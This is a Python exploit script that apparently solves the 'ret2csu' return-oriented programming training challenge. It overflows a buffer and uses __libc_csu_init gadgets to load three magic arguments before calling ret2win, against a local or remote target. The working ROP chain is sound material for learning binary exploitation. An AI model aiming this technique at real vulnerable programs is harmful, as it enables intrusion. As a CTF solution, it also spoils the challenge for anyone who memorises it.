#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./ret2csu', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''

b*pwnme

c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()


# ===========================================================
#                          EXPLOIT
# ===========================================================

'''
   0x0000000000400680 <+64>:    mov    rdx,r15
   0x0000000000400683 <+67>:    mov    rsi,r14
   0x0000000000400686 <+70>:    mov    edi,r13d
   0x0000000000400689 <+73>:    call   QWORD PTR [r12+rbx*8]

   0x000000000040069a <+90>:    pop    rbx
   0x000000000040069b <+91>:    pop    rbp
   0x000000000040069c <+92>:    pop    r12
   0x000000000040069e <+94>:    pop    r13
   0x00000000004006a0 <+96>:    pop    r14
   0x00000000004006a2 <+98>:    pop    r15
   0x00000000004006a4 <+100>:   ret
'''

def exploit():

    ret2win = exe.plt.ret2win
    initPtr = 0x6003b0

    call_gadget = 0x0000000000400680
    pop_rdi = 0x00000000004006a3
    pop_ret = 0x000000000040069a
    pop_rsi_r15 = 0x00000000004006a1
    ret = 0x00000000004006a4

    argu1 = 0xdeadbeefdeadbeef
    argu2 = 0xcafebabecafebabe
    argu3 = 0xd00df00dd00df00d

    pl = b'A' * 0x28
    pl += p64(ret)
    pl += p64(pop_ret) #pop rbx; pop rbp; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    pl += p64(0)
    pl += p64(1)
    pl += p64(initPtr)
    pl += p64(0)
    pl += p64(0)
    pl += p64(argu3)
    pl += p64(call_gadget)

    pl += p64(0)*7
    pl += p64(pop_rdi)
    pl += p64(argu1)
    pl += p64(pop_rsi_r15)
    pl += p64(argu2)
    pl += p64(0)
    pl += p64(ret2win)
    
    sla(b'> ', pl)

    interactive()

if __name__ == '__main__':
    exploit()
